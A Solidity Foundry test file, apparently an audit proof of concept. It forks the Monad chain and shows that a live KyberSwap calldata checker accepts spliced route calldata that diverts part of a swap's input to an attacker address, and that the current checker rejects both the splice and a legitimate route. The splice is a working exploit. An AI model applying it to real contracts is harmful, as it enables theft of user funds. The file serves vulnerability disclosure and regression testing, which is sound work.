// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";

import {
    BaseCalldataChecker
} from "contracts/calldata-checker/BaseCalldataChecker.sol";
import {
    KyberSwapChecker
} from "contracts/calldata-checker/swap-checker/KyberSwapChecker.sol";
import {ICentralRegistry} from "contracts/interfaces/ICentralRegistry.sol";
import {IERC20} from "contracts/interfaces/IERC20.sol";
import {
    IExternalCalldataChecker
} from "contracts/interfaces/IExternalCalldataChecker.sol";
import {IOracleManager} from "contracts/interfaces/IOracleManager.sol";
import {
    IMetaAggregationRouterV2
} from "contracts/interfaces/external/kyberswap/IMetaAggregationRouterV2.sol";
import {
    FixedPointMathLib
} from "contracts/libraries/external/FixedPointMathLib.sol";
import {SwapperLib} from "contracts/libraries/SwapperLib.sol";

contract KyberSwapProductHarness {
    function executeSafe(
        ICentralRegistry centralRegistry,
        SwapperLib.Swap memory action
    ) external returns (uint256) {
        return SwapperLib._swapSafe(centralRegistry, action);
    }

    function executeUnsafe(
        ICentralRegistry centralRegistry,
        SwapperLib.Swap memory action
    ) external returns (uint256) {
        return SwapperLib._swapUnsafe(centralRegistry, action);
    }
}

/// @notice Fixed-block product-path proof for the live historical Monad
///         KyberSwap checker. The embedded calldata is a real Kyber route for
///         5 USDC -> WMON, built for this harness immediately before block
///         88,400,807. Only desc.amount/srcReceivers/srcAmounts are changed.
/// @dev The historical `_swapUnsafe` branch is a dormant conditional-High
///      launch landmine, not current product reach. The `_swapSafe` splice is
///      bounded by oracle slippage. Current HEAD rejects both the splice and a
///      legitimate pool receiver, so HEAD is not safe to deploy unchanged.
contract KyberLiveCheckerCustodyAndReceiverPoC is Test, BaseCalldataChecker {
    uint256 internal constant FORK_BLOCK = 88_400_807;
    bytes32 internal constant FORK_BLOCK_HASH =
        0xd651ade7fbed94f0936a6d8680d5003e5ed1dde684427c9d9d3f2dbde381870f;
    uint256 internal constant COMPATIBILITY_FORK_BLOCK = 88_407_655;
    bytes32 internal constant COMPATIBILITY_FORK_BLOCK_HASH =
        0x0326084541b0016503093ac27e449e16c8a0bbf3d109852c516f73c1c3b63699;
    bytes32 internal constant LIVE_CHECKER_CODEHASH =
        0x4ea4180bb3008c400c49aaa22d008aeb68103782d54dac74046810298a0d407f;
    bytes32 internal constant COMPATIBILITY_CALL_HASH =
        0x7eebfdfbc232f41d2e3f6f7b0392b453e09318a1ebceff0b2d15c956130cde39;

    ICentralRegistry internal constant CENTRAL_REGISTRY =
        ICentralRegistry(0x1310f352f1389969Ece6741671c4B919523912fF);
    IExternalCalldataChecker internal constant LIVE_CHECKER =
        IExternalCalldataChecker(0xc63ac1e79c540DE6516679C97Bb00462fa6e15F7);
    IERC20 internal constant USDC =
        IERC20(0x754704Bc059F8C67012fEd69BC8A327a5aafb603);
    IERC20 internal constant WMON =
        IERC20(0x3bd359C1119dA7Da1D913D1C4D2B7c461115433A);

    address internal constant ROUTER =
        0x6131B5fae19EA4f9D964eAc0408E4408b66337b5;
    address internal constant EXECUTOR =
        0x8F10B468b06c6FD214B65F87778827F7D113f996;
    address internal constant OCTOSWAP_V2_POOL =
        0xD5A8564F1E4e450706C742c954a1cBDaEE602D62;
    address internal constant DAO = 0x0Acb7eF4D8733C719d60e0992B489b629bc55C02;
    address internal constant HARNESS =
        0x00000000000000000000000000000000c0dEc0DE;
    address internal constant ATTACKER =
        0x00000000000000000000000000000000BaDdcaFE;

    uint256 internal constant SIGNED_LEG_AMOUNT = 4_998_000;
    uint256 internal constant SAFE_OUTER_AMOUNT = 5_010_000;
    uint256 internal constant UNSAFE_OUTER_AMOUNT = 100_000_000;
    uint256 internal constant EXPECTED_MIN_OUT = 224_025_799_186_126_518_025;
    uint256 internal constant EXPECTED_OUTPUT = 225_147_563_163_759_681_300;
    uint256 internal constant FEE_BPS = 4;
    uint256 internal constant BPS = 10_000;
    uint256 internal constant SAFE_SLIPPAGE = 54 * 1e14;
    uint256 internal constant COMPATIBILITY_INPUT = 1e18;
    uint256 internal constant COMPATIBILITY_SRC_AMOUNT =
        999_600_000_000_000_000;
    uint256 internal constant COMPATIBILITY_MIN_OUT = 22_036;
    uint256 internal constant COMPATIBILITY_OUTPUT = 22_082;

    KyberSwapProductHarness internal harness;

    function setUp() public {
        string memory rpc = vm.envString("MON_NODE_URI_MONAD_ARCHIVE");
        vm.createSelectFork(rpc, FORK_BLOCK + 1);
        assertEq(
            blockhash(FORK_BLOCK), FORK_BLOCK_HASH, "fork block hash drift"
        );
        vm.createSelectFork(rpc, FORK_BLOCK);

        assertEq(block.chainid, 143, "wrong chain");
        assertEq(block.number, FORK_BLOCK, "wrong fork block");

        assertEq(
            CENTRAL_REGISTRY.externalCalldataChecker(ROUTER),
            address(LIVE_CHECKER),
            "live registry checker changed"
        );
        assertEq(
            address(LIVE_CHECKER).codehash,
            LIVE_CHECKER_CODEHASH,
            "live checker runtime changed"
        );
        assertEq(CENTRAL_REGISTRY.daoAddress(), DAO, "live DAO changed");

        _installHarness();
    }

    function test_liveSafePathCommitsBoundedAttackerTransfer() public {
        SwapperLib.Swap memory action = _splicedAction(SAFE_OUTER_AMOUNT);
        action.slippage = SAFE_SLIPPAGE;

        uint256 expectedFee = _fee(SAFE_OUTER_AMOUNT);
        uint256 expectedAttacker =
            SAFE_OUTER_AMOUNT - expectedFee - SIGNED_LEG_AMOUNT;
        uint256 minOut = LIVE_CHECKER.checkCalldata(action, HARNESS);
        assertEq(minOut, EXPECTED_MIN_OUT, "safe path checker min return");

        deal(address(USDC), HARNESS, SAFE_OUTER_AMOUNT);
        uint256 inputBefore = USDC.balanceOf(HARNESS);
        uint256 attackerBefore = USDC.balanceOf(ATTACKER);
        uint256 daoBefore = USDC.balanceOf(DAO);
        uint256 outputBefore = WMON.balanceOf(HARNESS);

        uint256 outAmount = harness.executeSafe(CENTRAL_REGISTRY, action);
        assertEq(outAmount, EXPECTED_OUTPUT, "safe path exact output");

        assertEq(
            inputBefore - USDC.balanceOf(HARNESS),
            SAFE_OUTER_AMOUNT,
            "safe path input debit"
        );
        assertEq(
            USDC.balanceOf(ATTACKER) - attackerBefore,
            expectedAttacker,
            "safe path attacker transfer"
        );
        assertEq(
            USDC.balanceOf(DAO) - daoBefore, expectedFee, "safe path DAO fee"
        );
        assertEq(
            WMON.balanceOf(HARNESS) - outputBefore,
            outAmount,
            "safe path output accounting"
        );
        assertGe(outAmount, minOut, "safe path min return");
        assertEq(
            SAFE_OUTER_AMOUNT,
            SIGNED_LEG_AMOUNT + expectedAttacker + expectedFee,
            "safe path input conservation"
        );
        assertEq(USDC.allowance(HARNESS, ROUTER), 0, "approval residue");
    }

    function test_liveUnsafePathAmplifiesAttackerTransfer() public {
        SwapperLib.Swap memory action = _splicedAction(UNSAFE_OUTER_AMOUNT);
        uint256 expectedFee = _fee(UNSAFE_OUTER_AMOUNT);
        uint256 expectedAttacker =
            UNSAFE_OUTER_AMOUNT - expectedFee - SIGNED_LEG_AMOUNT;
        uint256 minOut = LIVE_CHECKER.checkCalldata(action, HARNESS);
        assertEq(minOut, EXPECTED_MIN_OUT, "unsafe path checker min return");

        deal(address(USDC), HARNESS, UNSAFE_OUTER_AMOUNT);
        uint256 inputBefore = USDC.balanceOf(HARNESS);
        uint256 attackerBefore = USDC.balanceOf(ATTACKER);
        uint256 daoBefore = USDC.balanceOf(DAO);
        uint256 outputBefore = WMON.balanceOf(HARNESS);

        uint256 outAmount = harness.executeUnsafe(CENTRAL_REGISTRY, action);
        assertEq(outAmount, EXPECTED_OUTPUT, "unsafe path exact output");

        assertEq(
            inputBefore - USDC.balanceOf(HARNESS),
            UNSAFE_OUTER_AMOUNT,
            "unsafe path input debit"
        );
        assertEq(
            USDC.balanceOf(ATTACKER) - attackerBefore,
            expectedAttacker,
            "unsafe path attacker transfer"
        );
        assertEq(
            USDC.balanceOf(DAO) - daoBefore, expectedFee, "unsafe path DAO fee"
        );
        assertEq(
            WMON.balanceOf(HARNESS) - outputBefore,
            outAmount,
            "unsafe path output accounting"
        );
        assertGe(outAmount, minOut, "unsafe path min return");
        assertEq(
            UNSAFE_OUTER_AMOUNT,
            SIGNED_LEG_AMOUNT + expectedAttacker + expectedFee,
            "unsafe path input conservation"
        );
        assertEq(USDC.allowance(HARNESS, ROUTER), 0, "approval residue");
    }

    function test_currentCheckerRejectsTheSameSplice() public {
        SwapperLib.Swap memory action = _splicedAction(UNSAFE_OUTER_AMOUNT);
        address[] memory executors = new address[](1);
        executors[0] = EXECUTOR;
        KyberSwapChecker currentChecker =
            new KyberSwapChecker(ROUTER, executors, address(CENTRAL_REGISTRY));

        vm.expectRevert(
            KyberSwapChecker.KyberSwapChecker__InvalidSrcConfig.selector
        );
        currentChecker.checkCalldata(action, HARNESS);
    }

    /// @dev Real Kyber API route captured 2026-07-17T19:24:15.061Z for block
    ///      88,407,655. Quote request 1d76ea60-17dc-4f29-93c3-486fe49868e6;
    ///      build request 83f4adef-d8be-437f-9a06-584e17a97948; route ID
    ///      1d76ea60F9xPKZPD; calldata hash COMPATIBILITY_CALL_HASH.
    function test_currentCheckerRejectsLegitimateSingleReceiverRoute() public {
        _selectCompatibilityFork();
        SwapperLib.Swap memory action = _compatibilityAction();
        IMetaAggregationRouterV2.SwapExecutionParams memory execution =
            abi.decode(
                _getFuncParams(action.call),
                (IMetaAggregationRouterV2.SwapExecutionParams)
            );

        assertEq(keccak256(action.call), COMPATIBILITY_CALL_HASH, "call drift");
        assertEq(action.target, ROUTER, "router drift");
        assertEq(execution.callTarget, EXECUTOR, "executor drift");
        assertEq(execution.desc.amount, COMPATIBILITY_INPUT, "amount drift");
        assertEq(execution.desc.srcReceivers.length, 1, "receiver count");
        assertEq(
            execution.desc.srcReceivers[0],
            OCTOSWAP_V2_POOL,
            "real route receiver drift"
        );
        assertNotEq(
            execution.desc.srcReceivers[0],
            execution.callTarget,
            "falsifier requires distinct receiver"
        );
        assertEq(execution.desc.srcAmounts.length, 1, "source amount count");
        assertEq(
            execution.desc.srcAmounts[0],
            COMPATIBILITY_SRC_AMOUNT,
            "source amount drift"
        );
        assertEq(
            execution.desc.srcAmounts[0],
            execution.desc.amount - _fee(execution.desc.amount),
            "source amount must be exact post-fee amount"
        );
        assertEq(execution.desc.feeReceivers.length, 1, "fee receiver count");
        assertEq(execution.desc.feeReceivers[0], DAO, "fee receiver");
        assertEq(execution.desc.feeAmounts.length, 1, "fee amount count");
        assertEq(execution.desc.feeAmounts[0], FEE_BPS, "fee BPS");
        assertEq(execution.desc.flags, 0x280, "route flags");

        address[] memory executors = new address[](1);
        executors[0] = EXECUTOR;
        KyberSwapChecker currentChecker =
            new KyberSwapChecker(ROUTER, executors, address(CENTRAL_REGISTRY));
        vm.expectRevert(
            KyberSwapChecker.KyberSwapChecker__InvalidSrcConfig.selector
        );
        currentChecker.checkCalldata(action, HARNESS);

        uint256 minOut = LIVE_CHECKER.checkCalldata(action, HARNESS);
        assertEq(minOut, COMPATIBILITY_MIN_OUT, "live checker min return");

        deal(address(WMON), HARNESS, COMPATIBILITY_INPUT);
        uint256 inputBefore = WMON.balanceOf(HARNESS);
        uint256 daoBefore = WMON.balanceOf(DAO);
        uint256 outputBefore = USDC.balanceOf(HARNESS);

        uint256 outAmount = harness.executeSafe(CENTRAL_REGISTRY, action);
        assertEq(outAmount, COMPATIBILITY_OUTPUT, "fixed-block output drift");
        assertEq(
            inputBefore - WMON.balanceOf(HARNESS),
            COMPATIBILITY_INPUT,
            "input debit"
        );
        assertEq(
            WMON.balanceOf(DAO) - daoBefore,
            _fee(COMPATIBILITY_INPUT),
            "DAO fee"
        );
        assertEq(
            USDC.balanceOf(HARNESS) - outputBefore,
            outAmount,
            "output accounting"
        );
        assertGe(outAmount, minOut, "min return");
        assertEq(WMON.allowance(HARNESS, ROUTER), 0, "approval residue");
    }

    function test_safePathBelowRequiredSlippageRollsBackAtomically() public {
        SwapperLib.Swap memory action = _splicedAction(SAFE_OUTER_AMOUNT);
        action.slippage = SAFE_SLIPPAGE;
        deal(address(USDC), HARNESS, SAFE_OUTER_AMOUNT);

        uint256 snapshot = vm.snapshotState();
        uint256 successfulOut = harness.executeSafe(CENTRAL_REGISTRY, action);
        uint256 requiredSlippage =
            _requiredSlippage(SAFE_OUTER_AMOUNT, successfulOut);
        assertEq(
            requiredSlippage,
            1_760_971_867_040_815,
            "fixed-block oracle loss drift"
        );
        assertGt(requiredSlippage, 0, "route must lose oracle value");
        assertLt(requiredSlippage, SAFE_SLIPPAGE, "safe bound must pass");
        assertTrue(vm.revertToState(snapshot), "snapshot restore failed");

        action = _splicedAction(SAFE_OUTER_AMOUNT);
        action.slippage = requiredSlippage - 1;

        uint256 inputBefore = USDC.balanceOf(HARNESS);
        uint256 attackerBefore = USDC.balanceOf(ATTACKER);
        uint256 daoBefore = USDC.balanceOf(DAO);
        uint256 outputBefore = WMON.balanceOf(HARNESS);
        uint256 approvalBefore = USDC.allowance(HARNESS, ROUTER);

        vm.expectRevert(
            abi.encodeWithSelector(
                SwapperLib.SwapperLib__Slippage.selector, requiredSlippage
            )
        );
        harness.executeSafe(CENTRAL_REGISTRY, action);

        assertEq(USDC.balanceOf(HARNESS), inputBefore, "input must roll back");
        assertEq(
            USDC.balanceOf(ATTACKER), attackerBefore, "attacker must roll back"
        );
        assertEq(USDC.balanceOf(DAO), daoBefore, "DAO fee must roll back");
        assertEq(
            WMON.balanceOf(HARNESS), outputBefore, "output must roll back"
        );
        assertEq(
            USDC.allowance(HARNESS, ROUTER),
            approvalBefore,
            "approval must roll back"
        );
    }

    function _selectCompatibilityFork() internal {
        string memory rpc = vm.envString("MON_NODE_URI_MONAD_ARCHIVE");
        vm.createSelectFork(rpc, COMPATIBILITY_FORK_BLOCK + 1);
        assertEq(
            blockhash(COMPATIBILITY_FORK_BLOCK),
            COMPATIBILITY_FORK_BLOCK_HASH,
            "compatibility fork block hash drift"
        );
        vm.createSelectFork(rpc, COMPATIBILITY_FORK_BLOCK);

        assertEq(block.chainid, 143, "wrong compatibility chain");
        assertEq(
            block.number,
            COMPATIBILITY_FORK_BLOCK,
            "wrong compatibility fork block"
        );
        assertEq(
            CENTRAL_REGISTRY.externalCalldataChecker(ROUTER),
            address(LIVE_CHECKER),
            "compatibility checker changed"
        );
        assertEq(
            address(LIVE_CHECKER).codehash,
            LIVE_CHECKER_CODEHASH,
            "compatibility checker runtime changed"
        );
        assertEq(
            CENTRAL_REGISTRY.daoAddress(), DAO, "compatibility DAO changed"
        );
        _installHarness();
    }

    function _installHarness() internal {
        KyberSwapProductHarness implementation = new KyberSwapProductHarness();
        vm.etch(HARNESS, address(implementation).code);
        harness = KyberSwapProductHarness(HARNESS);
    }

    function _compatibilityAction()
        internal
        pure
        returns (SwapperLib.Swap memory action)
    {
        action = SwapperLib.Swap({
            inputToken: address(WMON),
            inputAmount: COMPATIBILITY_INPUT,
            outputToken: address(USDC),
            target: ROUTER,
            slippage: SAFE_SLIPPAGE,
            call: _embeddedCompatibilityCall()
        });
    }

    function _splicedAction(uint256 outerAmount)
        internal
        pure
        returns (SwapperLib.Swap memory action)
    {
        IMetaAggregationRouterV2.SwapExecutionParams memory execution =
            _embeddedExecution();

        require(execution.callTarget == EXECUTOR, "embedded executor drift");
        require(execution.desc.amount == 5_000_000, "embedded amount drift");
        require(
            execution.desc.srcReceivers.length == 1
                && execution.desc.srcReceivers[0] == EXECUTOR,
            "embedded receiver drift"
        );
        require(
            execution.desc.srcAmounts.length == 1
                && execution.desc.srcAmounts[0] == SIGNED_LEG_AMOUNT,
            "embedded source amount drift"
        );
        require(
            execution.desc.feeReceivers.length == 1
                && execution.desc.feeReceivers[0] == DAO,
            "embedded fee receiver drift"
        );
        require(
            execution.desc.feeAmounts.length == 1
                && execution.desc.feeAmounts[0] == FEE_BPS,
            "embedded fee amount drift"
        );
        require(execution.desc.flags == 0x280, "embedded flags drift");

        uint256 attackerAmount =
            outerAmount - _fee(outerAmount) - SIGNED_LEG_AMOUNT;
        address[] memory receivers = new address[](2);
        receivers[0] = EXECUTOR;
        receivers[1] = ATTACKER;
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = SIGNED_LEG_AMOUNT;
        amounts[1] = attackerAmount;

        execution.desc.amount = outerAmount;
        execution.desc.srcReceivers = receivers;
        execution.desc.srcAmounts = amounts;

        action = SwapperLib.Swap({
            inputToken: address(USDC),
            inputAmount: outerAmount,
            outputToken: address(WMON),
            target: ROUTER,
            slippage: 0,
            call: abi.encodeWithSelector(
                IMetaAggregationRouterV2.swap.selector, execution
            )
        });
    }

    function _fee(uint256 amount) internal pure returns (uint256) {
        return amount * FEE_BPS / BPS;
    }

    function _requiredSlippage(uint256 inputAmount, uint256 outputAmount)
        internal
        view
        returns (uint256)
    {
        IOracleManager oracle =
            IOracleManager(CENTRAL_REGISTRY.oracleManager());
        (uint256 inputPrice, uint256 inputError) =
            oracle.getPrice(address(USDC), true, true);
        (uint256 outputPrice, uint256 outputError) =
            oracle.getPrice(address(WMON), true, true);
        require(inputError == 0 && outputError == 0, "oracle error");

        uint256 valueIn = inputPrice * inputAmount / 1e6;
        uint256 valueOut = outputPrice * outputAmount / 1e18;
        require(valueIn > valueOut, "no oracle value loss");
        return FixedPointMathLib.mulDivUp(valueIn - valueOut, 1e18, valueIn);
    }

    function _embeddedCompatibilityCall()
        internal
        pure
        returns (bytes memory)
    {
        return hex"e21fd0e900000000000000000000000000000000000000000000000000000000000000200000000000000000000000008f10b468b06c6fd214b65f87778827f7d113f996000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000005a0000000000000000000000000000000000000000000000000000000000000082000000000000000000000000000000000000000000000000000000000000004e000000000000000000ddf4ae7657b000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000e000000000000000000000000000000000000000000000000000000000000000415fa6767c60dcd3593cf70dc9b38d7d12b8816e04b84607fbd9cdafeaa1999dad629003a1d65e8d36b08fd91421a75253ab61af9c2b6b4dc733c8c8260666d46e1c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003e000000000000000000000000000000000000000000000000000000000c0dec0de0000000000000000000000000000000000000000000000000000000000000140000000000000000000000000000000000000000000000000000000000000018000000000000000000d2dba5bd39b400000000000000000000e90db72f75ac00000000000000000000ddf4ae7657b00000000000000000000000000000000568400000000000000000000000000000000000000000000010000000f42400000000000000000000000000000004f82e73edb06d29ff62c91ec8f5ff06571bdeb290000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006a5a860f00000000000000000000000000000000000000000000000000000000000003c0000000000000000000000000000000000000000000000000000000000000000161f598cd0000000000000000d59b6dd8ca7ba3adb2279437079e927f959784000000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000001a00000000000000000000000003bd359c1119da7da1d913d1c4d2b7c461115433a8000000000000000000000e8bccd8c0000000000000000000ddf4ae7657b00000000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000ddf4ae7657b0000567e636a0000000000020001434f969593f9bb2655283ebf648733b7f46330aa000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000c0dec0de00000000000000000000000000000000000000000000000000000000000000200000001e0000000000002710d5a8564f1e4e450706c742c954a1cbdaee602d62000000000000000000000000754704bc059f8c67012fed69bc8a327a5aafb60380000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003bd359c1119da7da1d913d1c4d2b7c461115433a000000000000000000000000754704bc059f8c67012fed69bc8a327a5aafb603000000000000000000000000000000000000000000000000000000000000016000000000000000000000000000000000000000000000000000000000000001a000000000000000000000000000000000000000000000000000000000000001e0000000000000000000000000000000000000000000000000000000000000022000000000000000000000000000000000000000000000000000000000c0dec0de0000000000000000000000000000000000000000000000000de0b6b3a76400000000000000000000000000000000000000000000000000000000000000005614000000000000000000000000000000000000000000000000000000000000028000000000000000000000000000000000000000000000000000000000000002600000000000000000000000000000000000000000000000000000000000000001000000000000000000000000d5a8564f1e4e450706c742c954a1cbdaee602d6200000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000ddf4ae7657b000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000acb7ef4d8733c719d60e0992b489b629bc55c0200000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a97b22536f75726365223a2243757276616e636550726f746f636f6c222c22416d6f756e74496e555344223a22302e303232303238222c22416d6f756e744f7574555344223a22302e303232333033222c22416d6f756e744f7574223a223232313437222c22526f7574654944223a223164373665613630463978504b5a50443a3833663461646566324c354466356f47222c2254696d657374616d70223a313738343331363235357d0000000000000000000000000000000000000000000000";
    }

    function _embeddedExecution()
        internal
        pure
        returns (IMetaAggregationRouterV2.SwapExecutionParams memory execution)
    {
        bytes memory realRoute =
            hex"e21fd0e900000000000000000000000000000000000000000000000000000000000000200000000000000000000000008f10b468b06c6fd214b65f87778827f7d113f996000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000000000000000000000074000000000000000000000000000000000000000000000000000000000000009c00000000000000000000000000000000000000000000000000000000000000680000000000000000000000000004c4370000000000000000000000000004c4370000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000e0000000000000000000000000000000000000000000000000000000000000004186e01bd18c710b5210f2270354dcb546352a8dda1301f969e425cbb7a936991d6b9b232d4146752abc4572c5865f16cc02d1f32387bd44cf94f98730dd876fbb1b00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000058000000000000000000000000000000000000000000000000000000000c0dec0de00000000000000000000000000000000000000000000000000000000000001400000000000000000000000000000000000000000000000000000000000000180000000000000000000000000004873440000000000000000000000000050139c000000000000000000000000004c4370000000000000000c349b0429397900000000000000000000000000000000000000ccc62e92e9e50000000f42400000000000000000000000000000004f82e73edb06d29ff62c91ec8f5ff06571bdeb290000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006a5bc8190000000000000000000000000000000000000000000000000000000000000560000000000000000000000000000000000000000000000000000000000000000161f598cd0000000000000000d59b6dd8ca7ba3adb2279437079e927f959784000000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000001c00000000000000000000000000000000000000000000000000000000000000340000000000000000000000000754704bc059f8c67012fed69bc8a327a5aafb60380000000000000000000000000000004000000000000000000000000004c437000000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000004c437008fce0090000000000010001434f969593f9bb2655283ebf648733b7f46330aa00000000000000000000000000000000000000000000000000000000000000800000000000000000000000008f10b468b06c6fd214b65f87778827f7d113f9960000000000000000000000000000000000000000000000000000000000000020000000000000000000000102942644106b073e30d72c2c5d7529d5c296ea91ab000000000000000000000000e7cd86e13ac4309349f30b3435a9d337750fc82d80000000000000000000000000000005000000000000000000000000004c4f5500000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000004c4f553b9d6e090000000000000002434f969593f9bb2655283ebf648733b7f46330aa00000000000000000000000000000000000000000000000000000000000000800000000000000000000000008f10b468b06c6fd214b65f87778827f7d113f996000000000000000000000000000000000000000000000000000000000000004000000000000000000000000047bae1454139da12d7541c8d5f2b97364da67568000000000000000000000000000000000000000329aa17d7b2cc2bfc586963940000000000000000000000003bd359c1119da7da1d913d1c4d2b7c461115433a8000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000754704bc059f8c67012fed69bc8a327a5aafb6030000000000000000000000003bd359c1119da7da1d913d1c4d2b7c461115433a000000000000000000000000000000000000000000000000000000000000016000000000000000000000000000000000000000000000000000000000000001a000000000000000000000000000000000000000000000000000000000000001e0000000000000000000000000000000000000000000000000000000000000022000000000000000000000000000000000000000000000000000000000c0dec0de00000000000000000000000000000000000000000000000000000000004c4b4000000000000000000000000000000000000000000000000c24fb856b9410b7090000000000000000000000000000000000000000000000000000000000000280000000000000000000000000000000000000000000000000000000000000026000000000000000000000000000000000000000000000000000000000000000010000000000000000000000008f10b468b06c6fd214b65f87778827f7d113f996000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000004c437000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000acb7ef4d8733c719d60e0992b489b629bc55c0200000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ee7b22536f75726365223a2243757276616e636550726f746f636f6c222c22416d6f756e74496e555344223a22352e303231222c22416d6f756e744f7574555344223a22342e393932333833222c22416d6f756e744f7574223a22323235313531353536393730393831343235313531222c22526f7574654944223a2234636436636665345f305a47566f42443a65343061333962654a5639446b367931222c2254696d657374616d70223a313738343331333439372c22526566657272616c223a22307830416362376546344438373333433731396436306530393932423438396236323962633535433032227d000000000000000000000000000000000000";
        require(
            _getFuncSigHash(realRoute)
                == IMetaAggregationRouterV2.swap.selector,
            "embedded selector drift"
        );
        execution = abi.decode(
            _getFuncParams(realRoute),
            (IMetaAggregationRouterV2.SwapExecutionParams)
        );
    }
}
